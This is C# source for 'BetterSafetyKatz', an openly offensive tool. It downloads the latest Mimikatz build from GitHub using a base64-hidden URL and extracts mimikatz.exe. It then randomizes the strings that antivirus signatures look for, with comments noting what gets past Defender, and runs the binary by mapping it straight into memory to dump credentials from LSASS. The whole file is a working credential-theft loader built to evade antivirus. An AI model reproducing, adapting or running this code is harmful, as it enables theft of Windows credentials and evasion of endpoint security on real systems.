using System;
using System.IO;
using System.Security.Principal;
using System.Net;
using System.Text.RegularExpressions;
using System.Text;
using System.Linq;
using System.Threading;
using SharpSploit.Execution;
using SharpSploit.Execution.ManualMap;
using SharpSploit.Execution.DynamicInvoke;
using SharpSploit.Misc;



namespace BetterSafetyKatz
{
    class Program
    {
        static WebClient webClient = new WebClient();

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static void Main(string[] args)
        {
            Console.WriteLine("[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9");
            if (!IsHighIntegrity())
            {
                Console.WriteLine("[X] Not in high integrity, unable to grab a handle to lsass!");
            }
            else
            {
               
                if (!(IntPtr.Size == 8))
                {
                    Console.WriteLine("[X] Process is not 64-bit, this version of katz won't work yo'!");
                    return;
                }
                string latestPath;


                // @Arno0x
                IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
                if (defaultProxy != null)
                {
                    defaultProxy.Credentials = CredentialCache.DefaultCredentials;
                    webClient.Proxy = defaultProxy;
                }


                //TLS / SSL fix for old Net WebClient
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

                //headers needed for the github API to answer back
                webClient.Headers.Set("User-Agent", "request");

                if (args.Length != 0)
                {
                    latestPath = args[0];
                    Console.WriteLine("[+] Fetching " + latestPath);
                }
                else
                {
                    //Ask the API for the latest releases, should prob be async but lazy
                    string latestReleases = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9nZW50aWxraXdpL21pbWlrYXR6L3JlbGVhc2VzL2xhdGVzdA==")));

                    //Regex out the latest url for the zip build of katz
                    Regex urlRegex = new Regex(@"https:\/\/github.com\/([a-z\.-]*)\/([a-z\.-]*)\/releases\/download\/([0-9\.-]*)\/([a-z\.-]*)_trunk\.zip", RegexOptions.IgnoreCase);

                    //Pull the latest release as a ZIP file
                    latestPath = urlRegex.Matches(latestReleases)[0].ToString();

                    Console.WriteLine("[+] Contacting repo -> " + latestPath.Split(new string[] { "download/" }, StringSplitOptions.None)[1]);
                }

                //Declare as null
                byte[] zipStream = null;

                //Is it a URI?
                if (latestPath.StartsWith("http"))
                {
                    //Download
                    zipStream = webClient.DownloadData(latestPath);
                }
                else
                {
                    //Read file from path
                    zipStream = File.ReadAllBytes(latestPath);
                }

               
                MemoryStream catStream = new MemoryStream();

                // unzip.Extract(@"x64/BADWORD.exe", catStream);
                (new Unzip(new MemoryStream(zipStream))).Extract(Encoding.UTF8.GetString(Convert.FromBase64String("eDY0L21pbWlrYXR6LmV4ZQ==")), catStream);

                Console.WriteLine("[+] Randomizing strings in memory");


                //Turn katz into hex
                string hexCats = BitConverter.ToString(catStream.ToArray()).Replace("-", string.Empty);

                // 05.10.2020 -  Turns out we don't need to replace these to get past Defender, so it's excluded to avoid some functions breaking
                
                var strinsToReplaceUTF = new string[] {

                   //  "I_NetServerTrustPasswordsGet",
                   // "I_NetServerAuthenticate2",
                   // "SamEnumerateUsersInDomain",
                   //  "SamEnumerateDomainsInSamServer"

               };
               

                //Stuff that have signatures, but that we can give random names (Menu stuff)
                var stringsToSlightlyObfuscate = new string[] {
                  "bG9nb25QYXNzd29yZHM=",
                    "Y3JlZG1hbg==",
            };

                //In-code strings that we can give random names
                var stringsToRandomlyObfuscate = new string[] {
               "U2FtUXVlcnlJbmZvcm1hdGlvblVzZXI=",
                "U2FtT3BlblVzZXI=",
                "TGlzdHMgYWxsIGF2YWlsYWJsZSBwcm92aWRlcnMgY3JlZGVudGlhbHM=",
                "U3dpdGNoIChvciByZWluaXQpIHRvIExTQVNTIHByb2Nlc3MgIGNvbnRleHQ=",
                "TGlzdHMgTGl2ZVNTUCBjcmVkZW50aWFscw==",
                "bWltaWthdHo=",
                "TmV0d29ya0NsZWFydGV4dA==",
                "U2VydmljZQ==",
                "UHJveHk=",
                "UGF0aENvbWJpbmU=",
                "QmF0Y2g=",
                "VW5sb2Nr",
                "TmV0d29yaw==",
                "VW5rbm93biAh",
                "SW50ZXJhY3RpdmU=",
                "U2VydmljZQ==",
                "VW5kZWZpbmVkTG9nb25UeXBl",
                "TGlzdCBDcmVkZW50aWFscyBNYW5hZ2Vy",
                "ZHBhcGlzcnYuZGxs",
                "bXVsdGlyZHA=",
                "W2V4cGVyaW1lbnRhbF0gcGF0Y2ggVGVybWluYWwgU2VydmVyIHNlcnZpY2UgdG8gYWxsb3cgbXVsdGlwbGVzIHVzZXJz",
                "RHVtcENyZWRz",
                "bGl2ZXNzcC5kbGw=",
                "d2RpZ2VzdC5kbGw=",
                "a2VyYmVyb3MuZGxs",
                "dGVybXNydi5kbGw=",
                "dGVyRnJvbUFyZ3M=",
                "L3NhbSBvciAvc2lkIHRvIHRhcmdldCB0aGUgYWNjb3VudCBpcyBuZWVkZWQ=",
                "Q0VSVF9OQ1JZUFRfS0VZX1NQRUM=",
                "S2l3aQ==",
                "S2l3aUFuZENNRA==",
                "Q3J5cHRBY3F1aXJlQ2VydGlmaWNhdGVQcml2YXRlS2V5",
                "RVJST1I=",
                "QXJndW1lbnRQdHI=",
                "Q2FsbERsbE1haW5TQzE=",
                "Z2VudGlsa2l3aQ==",
                "QSBMYSBWaWUsIEEgTCdBbW91cg==",
                "dmluY2VudC5sZXRvdXhAZ21haWwuY29t",
                "b2UuZW8=",
                "YmVuamFtaW4=",
                "QmVuamFtaW4gREVMUFk=",
                "aHR0cDovL3BpbmdjYXN0bGUuY29t",
                "aHR0cDovL215c21hcnRsb2dvbi5jb20=",
                "VmluY2VudCBMRSBUT1VY"
                };

              
                //Give random names
                foreach (var sigString in stringsToRandomlyObfuscate.Select(x => Encoding.UTF8.GetString(Convert.FromBase64String(x))))
                {
                    string hexReplace = BitConverter.ToString(Encoding.Unicode.GetBytes(sigString)).Replace("-", string.Empty);

                    string newData = BitConverter.ToString(Encoding.Unicode.GetBytes(Helpers.RandomString(sigString.Length))).Replace("-", string.Empty);

                    hexCats = hexCats.Replace(hexReplace, newData);
                }

                foreach (var menuString in stringsToSlightlyObfuscate.Select(x => Encoding.UTF8.GetString(Convert.FromBase64String(x))))
                {

                    string hexReplace = BitConverter.ToString(Encoding.UTF8.GetBytes(menuString)).Replace("-", string.Empty);

                    char mostUsedChar = Helpers.MostOccurringCharInString(menuString);

                    char replaceChar = Helpers.GetLetter();

                    string newData = BitConverter.ToString(Encoding.UTF8.GetBytes(menuString.Replace(mostUsedChar, replaceChar))).Replace("-", string.Empty);

                    hexCats = hexCats.Replace(hexReplace, newData);
                }

                
               // foreach (var reffString in strinsToReplaceUTF)
               // {
               //     string hexReplace = BitConverter.ToString(Encoding.UTF8.GetBytes(reffString)).Replace("-", string.Empty);
               //
               //     string newData = BitConverter.ToString(Encoding.UTF8.GetBytes(Helpers.RandomString(reffString.Length))).Replace("-", string.Empty);
               //
               //     hexCats = hexCats.Replace(hexReplace, newData);
                //}
                

                PE.PE_MANUAL_MAP MapMap = Map.MapModuleToMemory(Helpers.StringToByteArray(hexCats));
                Generic.CallMappedPEModule(MapMap.PEINFO, MapMap.ModuleBase);

                Thread.Sleep(Timeout.Infinite);

             

            }
        }
    }


}
